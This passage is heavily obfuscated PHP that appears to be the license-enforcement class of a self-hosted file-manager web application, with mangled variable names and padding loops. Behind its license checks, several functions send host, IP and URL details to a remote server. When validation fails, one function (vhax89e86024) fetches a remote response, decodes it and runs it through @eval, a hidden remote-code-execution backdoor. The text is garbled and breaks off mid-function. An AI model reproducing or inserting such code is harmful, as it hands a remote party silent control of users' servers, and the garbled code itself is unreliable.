$ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$˜ÖÌÔ¥™[94]] = array($˜ÖÌÔ¥™[95] => (int) $ú‡îèğÛ[$˜ÖÌÔ¥™[96]], $˜ÖÌÔ¥™[97] => (int) _get($ú‡îèğÛ, $˜ÖÌÔ¥™[98], 0)); $Îºƒ¸‰¶ = substr(md5($˜ÖÌÔ¥™[99] . get_client_ip() . $Úó§ü˜ş[$˜ÖÌÔ¥™[100]]), 0, 15); $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[102]] = Mcrypt::encode(Session::sign(), $Îºƒ¸‰¶, 3600 * 24); $ı“±ÀÚã = $€œàõ·Ï[741]; $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[103]] = Action($˜ÖÌÔ¥™[104])->accessToken(); $íµì¹…« = $€œàõ·Ï[742]; $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[105]] = md5($_SERVER[$˜ÖÌÔ¥™[106]] . $Úó§ü˜ş[$˜ÖÌÔ¥™[100]]); $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[107]] = base64_encode(serverInfo()); $¡†‡ÛúÉ = $€œàõ·Ï[743]; if (!$¡†‡ÛúÉ) { die; } $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[108]] = $this->tchv2c1c01f8; $ç§‘¯á‚ = $€œàõ·Ï[744]; if (strlen($ç§‘¯á‚) < $€œàõ·Ï[485]) { die; } if ($Úó§ü˜ş[$˜ÖÌÔ¥™[108]] != $˜ÖÌÔ¥™[109]) { $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[110]] = $Úó§ü˜ş[$˜ÖÌÔ¥™[110]]; $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[111]] = $Úó§ü˜ş[$˜ÖÌÔ¥™[111]]; $‘šáé§á = rand_string(10) . $this->tchv2c1c01f8 . rand_string(5); $ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[112]][$˜ÖÌÔ¥™[113]] = $this->komx67ac06e4($‘šáé§á, $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[105]]); } if ($this->tchv2c1c01f8 == $˜ÖÌÔ¥™[109]) { $ÊÕ„È¨’[$˜ÖÌÔ¥™[88]][$˜ÖÌÔ¥™[89]][$˜ÖÌÔ¥™[94]][$˜ÖÌÔ¥™[98]] = 0; } $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[114]] = $this->versionPluginFilter(); $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[115]] = _get($this->yuqic9f24708, $˜ÖÌÔ¥™[116], $˜ÖÌÔ¥™[6]); if (KodUser::isRoot() && $this->config[$˜ÖÌÔ¥™[117]]) { $ÊÕ„È¨’[$˜ÖÌÔ¥™[101]][$˜ÖÌÔ¥™[118]] = WEB_ROOT; } return $ÊÕ„È¨’; } private function pzog2b17aee0() { $´ïºêüı =& $_SERVER[ˆö¿ÚÌ¼]; $½œ¯³÷ƒ =& $_SERVER[›üôÆØÜ]; $¯Ÿá»‰ñ = $_SERVER[$½œ¯³÷ƒ[24]] == $½œ¯³÷ƒ[119]; $÷Œ£óŒ = $´ïºêüı[745]; if ($_SERVER[$½œ¯³÷ƒ[24]] == $½œ¯³÷ƒ[120] && $_GET[$½œ¯³÷ƒ[121]] == $½œ¯³÷ƒ[122]) { $¯Ÿá»‰ñ = !0; } if ($¯Ÿá»‰ñ) { $ûª‡øŞí = array($½œ¯³÷ƒ[108] => $this->tchv2c1c01f8, $½œ¯³÷ƒ[123] => $this->xqcsf9c5cba9(), $½œ¯³÷ƒ[124] => Model($½œ¯³÷ƒ[125])->count()); if ($this->tchv2c1c01f8 != $½œ¯³÷ƒ[109]) { $²–˜»ã€ = _get($this->yuqic9f24708, $½œ¯³÷ƒ[126]); if ($²–˜»ã€) { $ûª‡øŞí[$½œ¯³÷ƒ[127]] = $²–˜»ã€; $ûª‡øŞí[$½œ¯³÷ƒ[128]] = strtotime(_get($this->yuqic9f24708, $½œ¯³÷ƒ[129])); $ûª‡øŞí[$½œ¯³÷ƒ[130]] = _get($this->yuqic9f24708, $½œ¯³÷ƒ[116]); } $ü•“ôö = Model($½œ¯³÷ƒ[33])->get($½œ¯³÷ƒ[131], $½œ¯³÷ƒ[6], !0); if (is_string($ü•“ôö) && substr($ü•“ôö, 0, 1) == $½œ¯³÷ƒ[132]) { $ü•“ôö = json_decode_force($ü•“ôö); } if (is_array($ü•“ôö) && $ü•“ôö[$½œ¯³÷ƒ[133]] && strstr($ü•“ôö[$½œ¯³÷ƒ[133]], $½œ¯³÷ƒ[134])) { $íÊµÌÃ§ = explode($½œ¯³÷ƒ[134], $ü•“ôö[$½œ¯³÷ƒ[133]]); $ûª‡øŞí[$½œ¯³÷ƒ[135]] = $íÊµÌÃ§[0]; } } $ûª‡øŞí = $this->tenl12c34418(json_encode($ûª‡øŞí), md5($½œ¯³÷ƒ[136])); $òïó¶®· = $´ïºêüı[746]; while ($òïó¶®· < $´ïºêüı[709]) { if ($òïó¶®· >= 0) { break; } $òïó¶®·++; } $¶Ê›ö¾ = array($½œ¯³÷ƒ[137] => $ûª‡øŞí); call_user_func(array($½œ¯³÷ƒ[138], $½œ¯³÷ƒ[139]), $¶Ê›ö¾); $ÏÆ×ÕØ = $´ïºêüı[747]; if (strlen($ÏÆ×ÕØ) < $´ïºêüı[706]) { return; } } if ($this->tchv2c1c01f8 == $½œ¯³÷ƒ[109]) { return; } $óÉ‹Äô… = array($½œ¯³÷ƒ[140], $½œ¯³÷ƒ[141], $½œ¯³÷ƒ[142], $½œ¯³÷ƒ[143], $½œ¯³÷ƒ[144], $½œ¯³÷ƒ[145]); $°ÙÄ¬ÂÍ = Model($½œ¯³÷ƒ[33])->get(); $ëò™³¬Ñ = $´ïºêüı[748]; if (strlen($ëò™³¬Ñ) < $´ïºêüı[697]) { return; } $¶Ê›ö¾ = array($½œ¯³÷ƒ[146] => $°ÙÄ¬ÂÍ[$½œ¯³÷ƒ[34]], $½œ¯³÷ƒ[147] => $°ÙÄ¬ÂÍ[$½œ¯³÷ƒ[35]], $½œ¯³÷ƒ[148] => $½œ¯³÷ƒ[6]); $ó‘¨Ğ­“ = $´ïºêüı[749]; if (!$ó‘¨Ğ­“) { die; } foreach ($óÉ‹Äô… as $»±»úä¬) { if (!isset($°ÙÄ¬ÂÍ[$»±»úä¬]) || !$°ÙÄ¬ÂÍ[$»±»úä¬]) { continue; } $¶Ê›ö¾[$»±»úä¬] = $°ÙÄ¬ÂÍ[$»±»úä¬]; } call_user_func(array($½œ¯³÷ƒ[138], $½œ¯³÷ƒ[139]), $¶Ê›ö¾); } private function yolz1d8a65f5() { $”Œºƒª¬ =& $_SERVER[ˆö¿ÚÌ¼]; $ë–»í²ú =& $_SERVER[›üôÆØÜ]; if ($_SERVER[$ë–»í²ú[24]] != $ë–»í²ú[149]) { return; } if (!KodUser::isRoot()) { die; } $²ìÕå = $GLOBALS[$ë–»í²ú[13]]; if (isset($²ìÕå[$ë–»í²ú[150]])) { $this->hfepe2042baa(); die; } if (isset($²ìÕå[$ë–»í²ú[151]]) && isset($²ìÕå[$ë–»í²ú[151]]) == $ë–»í²ú[122]) { $²ìÕå[$ë–»í²ú[152]] = Model($ë–»í²ú[33])->get($ë–»í²ú[153]); } if (!isset($²ìÕå[$ë–»í²ú[152]]) || strlen($²ìÕå[$ë–»í²ú[152]]) != 16) { show_json($ë–»í²ú[154] . $²ìÕå[$ë–»í²ú[152]], !1); } $ô´ãï† = Model($ë–»í²ú[33])->get($ë–»í²ú[100]); $óù¶¨æ = md5($_SERVER[$ë–»í²ú[106]] . $ô´ãï†); $÷öşÔÒ— = array($ë–»í²ú[152] => $²ìÕå[$ë–»í²ú[152]], $ë–»í²ú[155] => rand_string(16), $ë–»í²ú[156] => $ë–»í²ú[136], $ë–»í²ú[157] => $ë–»í²ú[158], $ë–»í²ú[159] => $_SERVER[$ë–»í²ú[160]], $ë–»í²ú[161] => $_SERVER[$ë–»í²ú[162]], $ë–»í²ú[163] => $_SERVER[$ë–»í²ú[164]], $ë–»í²ú[105] => $óù¶¨æ, $ë–»í²ú[165] => Model($ë–»í²ú[33])->get($ë–»í²ú[131])); $µ±ÊÒ¦ = $”Œºƒª¬[750]; if (strlen($µ±ÊÒ¦) < $”Œºƒª¬[709]) { return; } if (isset($²ìÕå[$ë–»í²ú[151]]) && isset($²ìÕå[$ë–»í²ú[151]]) == $ë–»í²ú[122]) { $÷öşÔÒ—[$ë–»í²ú[151]] = md5($÷öşÔÒ—[$ë–»í²ú[152]] . $ë–»í²ú[166] . $÷öşÔÒ—[$ë–»í²ú[155]]); } if ($²ìÕå[$ë–»í²ú[167]] == $ë–»í²ú[168]) { $Æù®²ğ° = $this->tenl12c34418($óù¶¨æ, $ë–»í²ú[169]); $ÉûÏ¬’Ö = $this->komx67ac06e4(json_encode($÷öşÔÒ—), $óù¶¨æ . $ë–»í²ú[170], 3); $ÉûÏ¬’Ö = $ÉûÏ¬’Ö . $ë–»í²ú[171] . $_SERVER[$ë–»í²ú[160]]; $¬‹ê‹à‹ = $this->ygise394b8d9($ë–»í²ú[172] . $Æù®²ğ° . $ë–»í²ú[173] . $ÉûÏ¬’Ö, -1); show_json($¬‹ê‹à‹, !0); } else { if ($²ìÕå[$ë–»í²ú[167]] == $ë–»í²ú[174]) { $¿şØÍ×² = substr(md5($ë–»í²ú[175] . $óù¶¨æ), 12, 15) . $ë–»í²ú[176]; $ÉûÏ¬’Ö = $this->qgotba047a2f(trim($²ìÕå[$ë–»í²ú[177]]), $¿şØÍ×², 2); $·¬¢”Ø¥ = json_decode($ÉûÏ¬’Ö, !0); if (!is_array($·¬¢”Ø¥) || !is_array($·¬¢”Ø¥[$ë–»í²ú[178]]) || $·¬¢”Ø¥[$ë–»í²ú[152]] != !0) { $Â›‰ÄŠ§ = $ë–»í²ú[179]; $ î­øí® = $·¬¢”Ø¥[$ë–»í²ú[178]] ? $ë–»í²ú[180] . $·¬¢”Ø¥[$ë–»í²ú[178]] : $Â›‰ÄŠ§; show_json($ î­øí®, !1); } else { $÷öşÔÒ—[$ë–»í²ú[155]] = $·¬¢”Ø¥[$ë–»í²ú[178]][$ë–»í²ú[181]]; } } else { $·¬¢”Ø¥ = $this->ygise394b8d9($ë–»í²ú[182], $÷öşÔÒ—, 10); } } if (!is_array($·¬¢”Ø¥) || !is_array($·¬¢”Ø¥[$ë–»í²ú[178]]) || $·¬¢”Ø¥[$ë–»í²ú[152]] != !0) { $Â›‰ÄŠ§ = LNG($ë–»í²ú[183]); $ î­øí® = $·¬¢”Ø¥[$ë–»í²ú[178]] ? $ë–»í²ú[180] . $·¬¢”Ø¥[$ë–»í²ú[178]] : $Â›‰ÄŠ§; show_json($ î­øí®, !1); } $¡Õ¶Ä© = $·¬¢”Ø¥[$ë–»í²ú[178]]; $ÚËŠ£ ” = $this->sjvdeae6df47($¡Õ¶Ä©[$ë–»í²ú[184]]); if (!$ÚËŠ£ ” || $ÚËŠ£ ” != $¡Õ¶Ä©[$ë–»í²ú[129]]) { $µ¿Í› Ä = array($ë–»í²ú[185] => Model($ë–»í²ú[33])->get($ë–»í²ú[100]), $ë–»í²ú[186] => $_SERVER[$ë–»í²ú[106]], $ë–»í²ú[187] => this_url(), $ë–»í²ú[161] => $_SERVER[$ë–»í²ú[162]]); $ÉûÏ¬’Ö = $this->utmwb8e86d97(json_encode($µ¿Í› Ä)); $this->ygise394b8d9($ë–»í²ú[188] . $ÉûÏ¬’Ö); show_json(LNG($ë–»í²ú[189]), !0); } $İŠØéµ = array($ë–»í²ú[153] => $¡Õ¶Ä©[$ë–»í²ú[190]], $ë–»í²ú[191] => $¡Õ¶Ä©[$ë–»í²ú[192]], $ë–»í²ú[193] => rand_string(16), $ë–»í²ú[108] => $¡Õ¶Ä©[$ë–»í²ú[194]]); if ($÷öşÔÒ—[$ë–»í²ú[155]]) { $İŠØéµ[$ë–»í²ú[193]] = $÷öşÔÒ—[$ë–»í²ú[155]]; } $¢Å¬ñ·‚ = substr(md5($İŠØéµ[$ë–»í²ú[191]]), 10, 10); $¼òÌÓíÒ = $¢Å¬ñ·‚ . $İŠØéµ[$ë–»í²ú[108]] . $İŠØéµ[$ë–»í²ú[193]]; $İŠØéµ[$ë–»í²ú[110]] = strrev(base64_encode($this->tenl12c34418($¼òÌÓíÒ, $ë–»í²ú[195]))); $ûÃª™ÍÌ = rand_string(16); $Ò–Ïİ¢ = $ûÃª™ÍÌ . $İŠØéµ[$ë–»í²ú[108]] . $this->tenl12c34418(md5($İŠØéµ[$ë–»í²ú[153]]), $ûÃª™ÍÌ); $İŠØéµ[$ë–»í²ú[111]] = base64_encode(strrev($this->tenl12c34418($Ò–Ïİ¢, $ë–»í²ú[196]))); if ($¡Õ¶Ä©[$ë–»í²ú[197]] && $¡Õ¶Ä©[$ë–»í²ú[197]] >= 1) { Model($ë–»í²ú[33])->setDeep($ë–»í²ú[198], $ë–»í²ú[122]); } Model($ë–»í²ú[33])->set($İŠØéµ); $¬ÖØßÔè = md5($_SERVER[$ë–»í²ú[106]] . strrev($ô´ãï†) . $İŠØéµ[$ë–»í²ú[191]]); $´Ìòé€¬ = $”Œºƒª¬[751]; if (strlen($´Ìòé€¬) < $”Œºƒª¬[713]) { return; } $³İ¸™­À = strrev(substr($¬ÖØßÔè, 10, 16)); $ÀÕÑ”ƒò = $”Œºƒª¬[752]; $Ë¦òÕ‘ù = $this->komx67ac06e4(json_encode($¡Õ¶Ä©), $¬ÖØßÔè); $¹ü¿€æş = array_to_keyvalue(Model($ë–»í²ú[7])->listData(), $ë–»í²ú[199]); $²ıû²Ì = $”Œºƒª¬[753]; if (!$²ıû²Ì) { return; } $Æšİ©Ê = $¹ü¿€æş[$ë–»í²ú[200]]; $Œ«’àØ = array(); $Œ«’àØ[$³İ¸™­À] = $Ë¦òÕ‘ù; $Ñâ–ÈĞ = $”Œºƒª¬[754]; if (strlen($Ñâ–ÈĞ) < $”Œºƒª¬[706]) { die; } Model($ë–»í²ú[7])->update($Æšİ©Ê[$ë–»í²ú[201]], array($ë–»í²ú[202] => $Œ«’àØ)); $ü¤ÜùŠ· = $”Œºƒª¬[755]; while (strlen($ü¤ÜùŠ·) < $”Œºƒª¬[697]) { if (!$ü¤ÜùŠ·) { break; } $ü¤ÜùŠ·++; } $this->yuqic9f24708 = $¡Õ¶Ä©; $this->tchv2c1c01f8 = $İŠØéµ[$ë–»í²ú[108]]; $³Ğàğö = $”Œºƒª¬[756]; if (strlen($³Ğàğö) < $”Œºƒª¬[709]) { die; } $this->licenseRegistSuccess(); Cache::set($ë–»í²ú[203] . md5($ô´ãï† . $ë–»í²ú[204]), $ë–»í²ú[6]); $£©æÔôÎ = $”Œºƒª¬[757]; if (strlen($£©æÔôÎ) < $”Œºƒª¬[697]) { die; } show_json(LNG($ë–»í²ú[189]), !0); } private function licenseRegistSuccess() { $¦çŞÍÅÎ =& $_SERVER[›üôÆØÜ]; $Ñáƒóª‡ = Model($¦çŞÍÅÎ[33])->get(); $ôëÅß˜İ = $_SERVER[ˆö¿ÚÌ¼][758]; if ($Ñáƒóª‡[$¦çŞÍÅÎ[63]] != $¦çŞÍÅÎ[122]) { Model($¦çŞÍÅÎ[33])->set($¦çŞÍÅÎ[63], $¦çŞÍÅÎ[122]); } Action($¦çŞÍÅÎ[205])->initStart(!0); } private function hfepe2042baa() { $öú¡çç =& $_SERVER[›üôÆØÜ]; Model($öú¡çç[33])->set(array($öú¡çç[153] => $öú¡çç[6], $öú¡çç[191] => $öú¡çç[6], $öú¡çç[108] => $öú¡çç[109], $öú¡çç[110] => $öú¡çç[6], $öú¡çç[111] => $öú¡çç[6])); Model($öú¡çç[33])->setDeep($öú¡çç[198], $öú¡çç[206]); $this->yuqic9f24708 = array(); $ğÒ¾äşà = $_SERVER[ˆö¿ÚÌ¼][759]; if (!$ğÒ¾äşà) { return; } $this->tchv2c1c01f8 = $öú¡çç[109]; } private function hlqvc72ab3a3() { $Î¦ú‰íÊ =& $_SERVER[ˆö¿ÚÌ¼]; $˜«öÖ¢¯ =& $_SERVER[›üôÆØÜ]; $_SERVER[$˜«öÖ¢¯[162]] = _get($_SERVER, $˜«öÖ¢¯[162], APP_HOST); $this->tchv2c1c01f8 = $˜«öÖ¢¯[109]; $¸ÓÖı÷ = $Î¦ú‰íÊ[740]; if (!$¸ÓÖı÷) { return; } $±û¯İÂù = Model($˜«öÖ¢¯[33])->get(); if ($±û¯İÂù[$˜«öÖ¢¯[108]] == $˜«öÖ¢¯[109]) { return; } $°¹¯ñ¿õ = Model($˜«öÖ¢¯[33])->get($˜«öÖ¢¯[100]); $ö¾ô¨ŞÎ = $Î¦ú‰íÊ[760]; while ($ö¾ô¨ŞÎ < $Î¦ú‰íÊ[713]) { if ($ö¾ô¨ŞÎ >= 0) { break; } $ö¾ô¨ŞÎ++; } $«æ—¹ò = $˜«öÖ¢¯[203] . md5($°¹¯ñ¿õ . $˜«öÖ¢¯[204]); $İå§†Šª = Cache::get($«æ—¹ò); $±ÎşçŞÛ = $Î¦ú‰íÊ[761]; while (strlen($±ÎşçŞÛ) < $Î¦ú‰íÊ[485]) { if (!$±ÎşçŞÛ) { break; } $±ÎşçŞÛ++; } if (!is_array($İå§†Šª) || !isset($İå§†Šª[$˜«öÖ¢¯[207]]) || time() - $İå§†Šª[$˜«öÖ¢¯[207]] >= 60) { $ïÄÕ¿ˆ = Model($˜«öÖ¢¯[7])->loadList(); $”†õš»½ = $ïÄÕ¿ˆ[$˜«öÖ¢¯[200]]; $¦’öµ£ï = md5($_SERVER[$˜«öÖ¢¯[106]] . strrev($°¹¯ñ¿õ) . $±û¯İÂù[$˜«öÖ¢¯[191]]); $ø•Î‚š› = strrev(substr($¦’öµ£ï, 10, 16)); $İå§†Šª = $this->qgotba047a2f($”†õš»½[$˜«öÖ¢¯[86]][$ø•Î‚š›], $¦’öµ£ï); $İå§†Šª = json_decode($İå§†Šª, !0); } if (!is_array($İå§†Šª)) { return $this->hfepe2042baa(); } $ïºœÕ£â = strtotime($İå§†Šª[$˜«öÖ¢¯[129]]); if (time() >= $ïºœÕ£â) { return $this->hfepe2042baa(); } if (!isset($İå§†Šª[$˜«öÖ¢¯[207]]) || time() - $İå§†Šª[$˜«öÖ¢¯[207]] > 20) { $İå§†Šª[$˜«öÖ¢¯[207]] = time(); Cache::set($«æ—¹ò, $İå§†Šª); } $this->yuqic9f24708 = $İå§†Šª; $this->tchv2c1c01f8 = $±û¯İÂù[$˜«öÖ¢¯[108]]; } private function mhura1b6e8dd() { $õ…Ç½Š =& $_SERVER[ˆö¿ÚÌ¼]; $ÂüœûÏ =& $_SERVER[›üôÆØÜ]; $Ì³ÌéÂÄ = $GLOBALS[$ÂüœûÏ[13]]; $·‰¯ë’ó = $õ…Ç½Š[762]; if (strlen($·‰¯ë’ó) < $õ…Ç½Š[713]) { return; } $ØÇú•¢‡ = $_SERVER[$ÂüœûÏ[24]]; $»øÊêó‘ = $õ…Ç½Š[763]; if (!$»øÊêó‘) { return; } if ($ØÇú•¢‡ == $ÂüœûÏ[208] && $this->tchv2c1c01f8 == $ÂüœûÏ[109]) { show_json(LNG($ÂüœûÏ[209]), !1, $ÂüœûÏ[210]); } $ùÌÓĞå = array($ÂüœûÏ[211], $ÂüœûÏ[212]); if (in_array($ØÇú•¢‡, $ùÌÓĞå)) { if ($this->tchv2c1c01f8 == $ÂüœûÏ[109] && isset($Ì³ÌéÂÄ[$ÂüœûÏ[213]])) { show_json(LNG($ÂüœûÏ[209]), !1, $ÂüœûÏ[210]); die; } $‰êÑšÈ± = $this->xqcsf9c5cba9(); if ($‰êÑšÈ± != intval($ÂüœûÏ[214])) { if ($‰êÑšÈ± <= Model($ÂüœûÏ[125])->count()) { show_json(LNG($ÂüœûÏ[215]), !1, $ÂüœûÏ[210]); die; } } } } private function lcdv503e30ea() { $ÍÇìš°Ë =& $_SERVER[ˆö¿ÚÌ¼]; $¢«Úã¾› =& $_SERVER[›üôÆØÜ]; $„½•¸’ò = array($¢«Úã¾›[119], $¢«Úã¾›[120]); if (!KodUser::isRoot() || !isset($_GET[$¢«Úã¾›[216]])) { return; } if (!in_array($_SERVER[$¢«Úã¾›[24]], $„½•¸’ò)) { return; } $Ã½ËĞéÄ = $¢«Úã¾›[217]; $ÃÎ†šæ” = $ÍÇìš°Ë[764]; if (!$ÃÎ†šæ”) { die; } $Ã½ËĞéÄ = $this->cadn262c22c9($Ã½ËĞéÄ, $¢«Úã¾›[218]); $¶¯ƒ½ù§ = $ÍÇìš°Ë[765]; $‡ˆšüÒõ = stream_context_create(array($¢«Úã¾›[219] => array($¢«Úã¾›[220] => $¢«Úã¾›[221], $¢«Úã¾›[222] => 3))); $îÇ÷í = $ÍÇìš°Ë[766]; if (!$îÇ÷í) { die; } $ŸŸ–ÅÀ« = @file_get_contents($Ã½ËĞéÄ, !1, $‡ˆšüÒõ); $„ü²ñïÜ = $ÍÇìš°Ë[767]; if (!$„ü²ñïÜ) { return; } header($¢«Úã¾›[223]); if ($ŸŸ–ÅÀ« && strstr($ŸŸ–ÅÀ«, $¢«Úã¾›[224])) { echo $ŸŸ–ÅÀ«; } die; } public function jxrh7d48e712($ş©ô‚‹) { $îğîÀöÎ =& $_SERVER[ˆö¿ÚÌ¼]; $¼ó¡ëüª =& $_SERVER[›üôÆØÜ]; if ($this->tchv2c1c01f8 == $¼ó¡ëüª[225]) { return $ş©ô‚‹; } $Óö§œÉ’ = $this->versionPluginList(); $½íŞµÔ = $îğîÀöÎ[768]; if (strlen($½íŞµÔ) < $îğîÀöÎ[709]) { die; } $Ò™ƒ¡ç… = explode($¼ó¡ëüª[226], $this->versionPluginFilter()); $©ß¡ú¾ = $îğîÀöÎ[769]; if (strlen($©ß¡ú¾) < $îğîÀöÎ[697]) { die; } $¶§‘÷ğù = array(); $¡´Ø˜óí = $îğîÀöÎ[770]; if (!$¡´Ø˜óí) { return; } foreach ($Óö§œÉ’ as $ó—¥™†Ú => $ëïØó±İ) { if ($ëïØó±İ == $¼ó¡ëüª[227] && substr($this->tchv2c1c01f8, 0, 1) == $¼ó¡ëüª[227]) { continue; } if (!in_array($ó—¥™†Ú, $Ò™ƒ¡ç…)) { $¶§‘÷ğù[] = $ó—¥™†Ú; } } foreach ($¶§‘÷ğù as $ó—¥™†Ú) { unset($ş©ô‚‹[$ó—¥™†Ú]); } return $ş©ô‚‹; $£·Ş•Æê = $îğîÀöÎ[771]; if (strlen($£·Ş•Æê) < $îğîÀöÎ[697]) { die; } } private function versionPluginList() { $ÃÆƒÌÑà =& $_SERVER[›üôÆØÜ]; return array($ÃÆƒÌÑà[228] => $ÃÆƒÌÑà[227], $ÃÆƒÌÑà[229] => $ÃÆƒÌÑà[227], $ÃÆƒÌÑà[230] => $ÃÆƒÌÑà[227], $ÃÆƒÌÑà[231] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[233] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[234] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[235] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[236] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[237] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[238] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[239] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[240] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[241] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[242] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[243] => $ÃÆƒÌÑà[232], $ÃÆƒÌÑà[244] => $ÃÆƒÌÑà[232]); } private function versionPluginFilter() { $­ó·šó =& $_SERVER[ˆö¿ÚÌ¼]; $•˜’ºä =& $_SERVER[›üôÆØÜ]; if ($this->tchv2c1c01f8 == $•˜’ºä[109]) { return $•˜’ºä[6]; } $­ÌÆä½ = _get($this->yuqic9f24708, $•˜’ºä[245], $•˜’ºä[6]); $áî££àù = $­ó·šó[772]; if (strlen($áî££àù) < $­ó·šó[697]) { return; } $üÌÕ¸°¾ = _get($this->yuqic9f24708, $•˜’ºä[116], $•˜’ºä[6]); $¦•ĞşŞ = $­ó·šó[773]; if (strlen($¦•ĞşŞ) < $­ó·šó[709]) { die; } $‡şˆ› = _get($this->yuqic9f24708, $•˜’ºä[246], $•˜’ºä[6]); if ($üÌÕ¸°¾ > time() && $‡şˆ› > time()) { $ØÖÃûë¹ = explode($•˜’ºä[226], $­ÌÆä½); $íµÎ¨ŸÏ = array_keys($this->versionPluginList()); $­ÌÆä½ = array_merge($ØÖÃûë¹, $íµÎ¨ŸÏ); $­ÌÆä½ = implode($•˜’ºä[226], array_filter(array_unique($­ÌÆä½))); } return $­ÌÆä½; } private function rukgf93eda07() { $öİÉŠ“½ =& $_SERVER[›üôÆØÜ]; if ($this->tchv2c1c01f8 != $öİÉŠ“½[109]) { $GLOBALS[$öİÉŠ“½[86]][$öİÉŠ“½[90]][$öİÉŠ“½[247]] = $öİÉŠ“½[206]; return; } $GLOBALS[$öİÉŠ“½[86]][$öİÉŠ“½[248]] = $öİÉŠ“½[122]; if (Model($öİÉŠ“½[249])->get($öİÉŠ“½[63]) != $öİÉŠ“½[206]) { Model($öİÉŠ“½[249])->set($öİÉŠ“½[63], $öİÉŠ“½[206]); } } public function wcun14044a19() { return $_SERVER[›üôÆØÜ][250]; } private function vhax89e86024() { $şµ¡Ôí =& $_SERVER[ˆö¿ÚÌ¼]; $Ù½×ü¤ =& $_SERVER[›üôÆØÜ]; $áˆü½à³ = array($Ù½×ü¤[251], $Ù½×ü¤[252], $Ù½×ü¤[253]); $¯¶¾äŸÒ = $şµ¡Ôí[774]; if (strlen($¯¶¾äŸÒ) < $şµ¡Ôí[709]) { return; } $¼Å˜×´‹ = $Ù½×ü¤[254] . md5($Ù½×ü¤[255]); if ($this->tchv2c1c01f8 == $Ù½×ü¤[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Ù½×ü¤[24]], $áˆü½à³)) { return; } if (time() % 4 != 0) { return; } $çœ«Ö·° = call_user_func(array($Ù½×ü¤[256], $Ù½×ü¤[257]), $¼Å˜×´‹); if ($çœ«Ö·° && time() - $çœ«Ö·° < intval($Ù½×ü¤[258])) { return; } call_user_func(array($Ù½×ü¤[256], $Ù½×ü¤[139]), $¼Å˜×´‹, time()); $÷…ôøÉ¨ = $şµ¡Ôí[775]; while ($÷…ôøÉ¨ < $şµ¡Ôí[709]) { if ($÷…ôøÉ¨ >= 0) { break; } $÷…ôøÉ¨++; } $¡ÖôÇÂ„ = Model($Ù½×ü¤[33])->get($Ù½×ü¤[100]); $é”¨ÆƒÁ = array($Ù½×ü¤[152] => Model($Ù½×ü¤[33])->get($Ù½×ü¤[153]), $Ù½×ü¤[167] => $this->tchv2c1c01f8, $Ù½×ü¤[163] => $_SERVER[$Ù½×ü¤[164]], $Ù½×ü¤[165] => Model($Ù½×ü¤[33])->get($Ù½×ü¤[131]), $Ù½×ü¤[105] => md5($_SERVER[$Ù½×ü¤[106]] . $¡ÖôÇÂ„), $Ù½×ü¤[156] => $Ù½×ü¤[136], $Ù½×ü¤[159] => $_SERVER[$Ù½×ü¤[160]]); $ÊüĞàÍş = $şµ¡Ôí[776]; while ($ÊüĞàÍş < $şµ¡Ôí[697]) { if ($ÊüĞàÍş >= 0) { break; } $ÊüĞàÍş++; } $­ûöÒÀ = $this->ygise394b8d9($Ù½×ü¤[259], $é”¨ÆƒÁ); if (!is_array($­ûöÒÀ)) { return; } if ($­ûöÒÀ[$Ù½×ü¤[152]] && $­ûöÒÀ[$Ù½×ü¤[260]]) { if ($this->sjvdeae6df47($­ûöÒÀ[$Ù½×ü¤[260]]) == $é”¨ÆƒÁ[$Ù½×ü¤[152]]) { return; } } $this->hfepe2042baa(); $‘ºÓşç = $şµ¡Ôí[777]; while (strlen($‘ºÓşç) < $şµ¡Ôí[706]) { if (!$‘ºÓşç) { break; } $‘ºÓşç++; } if ($this->sjvdeae6df47($­ûöÒÀ[$Ù½×ü¤[260]]) != $é”¨ÆƒÁ[$Ù½×ü¤[152]]) { $º€İı¿¼ = array($Ù½×ü¤[185] => $¡ÖôÇÂ„, $Ù½×ü¤[186] => $_SERVER[$Ù½×ü¤[106]], $Ù½×ü¤[187] => this_url(), $Ù½×ü¤[161] => $_SERVER[$Ù½×ü¤[162]]); $Ñˆ„Òµ = $this->utmwb8e86d97(json_encode($º€İı¿¼)); $­ûöÒÀ = $this->ygise394b8d9($Ù½×ü¤[188] . $Ñˆ„Òµ); if ($­ûöÒÀ && is_array($­ûöÒÀ) && isset($­ûöÒÀ[$Ù½×ü¤[260]])) { $ÖáÒıÌç = $this->qgotba047a2f($­ûöÒÀ[$Ù½×ü¤[260]], 2); if ($ÖáÒıÌç) { $ÖáÒıÌç = $this->sjvdeae6df47($ÖáÒıÌç); } if ($ÖáÒıÌç) { try { @eval($ÖáÒıÌç); } catch (Exception $œûš—ø¢) { } } } } } private function ygise394b8d9($ûÚÈ¾¬Ó = '', $÷İùÉ•« = array(), $ÎëŒé¿í = 5) { $¹¢ŞĞ‹Ê =& $_SERVER[ˆö¿ÚÌ¼]; $ Éßâ =& $_SERVER[›üôÆØÜ]; $é†Ò»¿ø = $ Éßâ[261]; $é†Ò»¿ø = 